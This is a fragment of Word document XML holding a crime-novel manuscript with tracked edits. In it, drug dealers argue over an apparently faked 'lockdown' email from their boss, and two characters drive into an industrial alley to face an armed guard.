      <w:r w:rsidRPr="000D3488">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t xml:space="preserve">Those of you on payroll will still get your money for tonight. Those of you on commission, DO NOT TRY TO MAKE ONE LAST SALE. DISCARD product, understood? THAT IS ORDER. You try to sell anything more tonight, you will </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>regret it. </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>I will contact each of you IN PERSON, FACE TO FACE, to tell you when this is over. Until then, LOCKDOWN. </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Be safe.</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>-Sergey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now Danny was watching the fallout from Sergey’s decree, wishing he had some popcorn and Milk Duds.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>From: Jimmy J &lt;rebelyeller88@gmail.com&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Subject: RE: Lockdown</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Sergey, I can’t just ditch my stash, man. Customers are lined up. I got a shorty to feed. Don’t do this.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>From: Booty Fresh &lt;reggiereggie123@1and1email.com&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Subject: RE: Lockdown</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Boss, I’m sitting here with a suitcase full of cash ready to make an exchange with Silvio’s guys at the marina. You tellin me you want me to cancel on them? They not gonna be happy.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>From: 4 Shizzy&lt;4shizzy@yahoo.com&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Subject: O NO U DINT!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Sergey dog u know u my bro but there is NO WAY urcallin lockdown when imsittin on a motherfucking half-ki. Send me some boys stat, i got a guy in portlandgonna take this shit off my hands and i really dontwanna deal wit him all by my lonesome.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>From: Jimmy J &lt;rebelyeller88@gmail.com&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Subject: RE: O NO U DINT!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>At least he’s letting you keep your stash, Shiz. He wants the rest of us to just throw everything away.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>From: Leo &lt;leonya@pash.ly&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Subject: RE: O NO U DINT!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>4 Shizzy do NOT move that batch to Portland! I will send Leo to buy it back from you IN PERSON. Booty, I will meet with Silvio's men myself tonight. Are you at marina yet?</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>-Sergey</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>From: Miguel &lt;mg323329@msn.com&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Subject: RE: O NO U DINT!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>¡Booty Fresh no le digadondeustedesta, el podriaser un impostor!</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>From: 4 Shizzy&lt;4shizzy@yahoo.com&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Subject: RE: O NO U DINT!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Yo Miguel’s right. How do we know ur the real Sergey?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>From: Jimmy J &lt;rebelyeller88@gmail.com&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Subject: RE: O NO U DINT!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Hey that’s a good point. How do we even know it was the real Sergey that called lockdown? I bet this is all just some other crew trying to fuck with us. Screw that, I ain’t throwing away shit.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Danny read the emails coming in, he did his best to refrain from guffawing like a tickled hyena. He failed.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“Things going according to plan?” Jason asked</w:t>
      </w:r>
      <w:del w:id="2012" w:author="TextVet" w:date="2016-03-21T16:50:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002F5175">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> him</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think we broke the mob!” Danny chortled.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took a breath. “You feeling ready to go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“Don’t get us killed,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“Let me do all the talking,</w:t>
      </w:r>
      <w:ins w:id="2013" w:author="TextVet" w:date="2016-03-21T16:51:00Z">
        <w:r w:rsidR="001A6104">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2014" w:author="TextVet" w:date="2016-03-21T16:51:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001A6104">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>” said Jason, “</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">and I think we’ll be alright. Now, you’re sure we got all my insurance papers and license info out of here </w:t>
      </w:r>
      <w:ins w:id="2015" w:author="TextVet" w:date="2016-03-21T16:52:00Z">
        <w:r w:rsidR="00E62D8D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">and </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>back on Pill Hill?”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“Yep, I left everything with Natalie,” Danny said. “This car’s as clean as a hard drive inside a tokamak.”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blinked at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um, it’s </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>clean</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, is what I'm getting at,” Danny clarified. “There’s no trace of your identity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“Good. I don’t want a repeat of what happened to Tina. Maybe we should slap mud on my license plate or something, too?”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commentRangeStart w:id="2016"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">“That won’t be necessary,” </w:t>
      </w:r>
      <w:del w:id="2017" w:author="TextVet" w:date="2016-03-21T16:54:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00724B26">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Danny</w:t>
      </w:r>
      <w:ins w:id="2018" w:author="TextVet" w:date="2016-03-21T16:54:00Z">
        <w:r w:rsidR="00724B26">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> stated</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“Why not? Because you don’t think the Russian mob can hack into the Department of Motor Vehicles?”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Because you don’t have a front plate, and half of your back plate is currently a bullet hole.”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“Oh,” Jason said with a frown. “Alright. Well, then. Let’s get started.”</w:t>
      </w:r>
    </w:p>
    <w:commentRangeEnd w:id="2016"/>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00A8104D" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="2016"/>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Jason turned the Navigator’s ignition. But before driving, he ran his hands through his hair and ruffled up his gelled strands. He </w:t>
      </w:r>
      <w:ins w:id="2019" w:author="TextVet" w:date="2016-03-21T16:56:00Z">
        <w:r w:rsidR="00A97873">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>checked</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2020" w:author="TextVet" w:date="2016-03-21T16:56:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00A97873">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>looked at</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> himself in the Navigator’s rearview mirror, drew several long breaths, and stared deeply into his own eyes. He kept his gaze for almost a minute</w:t>
      </w:r>
      <w:r w:rsidR="00025F0F">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00025F0F">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n that time</w:t>
      </w:r>
      <w:r w:rsidR="00025F0F">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> his face changed subtly.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found the prolonged silence awkward. “We gonna go…?”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00EF2605" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2021" w:author="TextVet" w:date="2016-03-21T17:00:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>G</w:t>
        </w:r>
        <w:r w:rsidRPr="000D3488">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>lar</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
        <w:r w:rsidRPr="000D3488">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> contemptuously</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">, </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Jason turned to Danny</w:t>
      </w:r>
      <w:del w:id="2022" w:author="TextVet" w:date="2016-03-21T17:00:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00EF2605">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">, </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2023" w:author="TextVet" w:date="2016-03-21T16:59:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00891AB8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">and </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2024" w:author="TextVet" w:date="2016-03-21T17:00:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00EF2605">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>glar</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2025" w:author="TextVet" w:date="2016-03-21T16:59:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00891AB8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ed</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2026" w:author="TextVet" w:date="2016-03-21T17:00:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00EF2605">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2027" w:author="TextVet" w:date="2016-03-21T16:59:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00891AB8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">at him </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2028" w:author="TextVet" w:date="2016-03-21T17:00:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00EF2605">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>contemptuously</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. His wrinkle-framed eyes looked dark. Brooding. Strong. And </w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>mean</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “I told you to keep your mouth shut!” he snarled with a voice half an octave lower than usual. “Don’t make me tell you again.” With that, he set his face forward and put the car into gear.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drove along a small gray road that served as a tributary for East Marginal Way. The road wound through the busy spaces between the fulfillment houses, abuzz with workmen loading boxes onto trucks. The car drove slowly, adhering carefully to the route on Jason’s GPS unit. The activity around them dwindled as they headed deeper into the industrial complex.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reached the tall</w:t>
      </w:r>
      <w:ins w:id="2029" w:author="TextVet" w:date="2016-03-21T17:02:00Z">
        <w:r w:rsidR="0069450E">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weed-lined back fence of the property, and rounded a corner to a long, wide alley. Along the back fence stood dumpsters and a handful of parked cars. A few poorly maintained streetlamps created islands of dim, shadow-laden visibility in the long stretch of darkness.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headlights of the SUV illuminated the dark figure far in the alley, sitting at the bottom of a flight of metal stairs affixed to the brick exterior of the building. When the headlights fell on him, he moved to stand in the car’s path. He was a muscular, well-built black man, sporting shoulder-length dreadlocks. He openly carried a complex-looking gun, blocky with a wiry protrusion on its back and a long ammo cartridge extending down from its grip.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showed no apprehension. He pulled to a stop just a few yards short of the man, and turned on the car’s cabin lights.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D781F" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:ins w:id="2030" w:author="TextVet" w:date="2016-03-21T17:05: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“Private property!” the guard </w:t>
      </w:r>
      <w:ins w:id="2031" w:author="TextVet" w:date="2016-03-21T17:05:00Z">
        <w:r w:rsidR="00FF5304">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>challenged</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2032" w:author="TextVet" w:date="2016-03-21T17:05:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00FF5304">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>said</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> forcefully, his eyes glowing starkly in the SUV’s headlights. “Turn around.”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Jason cut the engine and stepped out slowly, keeping his hands visible.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guard lifted the blocky gun. “You got ‘til the count of three. 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stood beside the car and said, “Eugene’s been shot.”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man’s eyes widened. “What?”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lab had heavy night security,” </w:t>
      </w:r>
      <w:del w:id="2033" w:author="TextVet" w:date="2016-03-22T09:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004C53B0">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Jason</w:t>
      </w:r>
      <w:ins w:id="2034" w:author="TextVet" w:date="2016-03-22T09:19:00Z">
        <w:r w:rsidR="004C53B0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> clarified</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, his voice gritty. “Things got ugly back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bitch said they had nothing,” the man said tensely.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bitch </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="2035" w:author="TextVet" w:date="2016-03-22T09:19:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>lied</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">,” </w:t>
      </w:r>
      <w:del w:id="2036" w:author="TextVet" w:date="2016-03-22T09:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00ED0A31">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Jason</w:t>
      </w:r>
      <w:ins w:id="2037" w:author="TextVet" w:date="2016-03-22T09:19:00Z">
        <w:r w:rsidR="00ED0A31">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> sneered</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
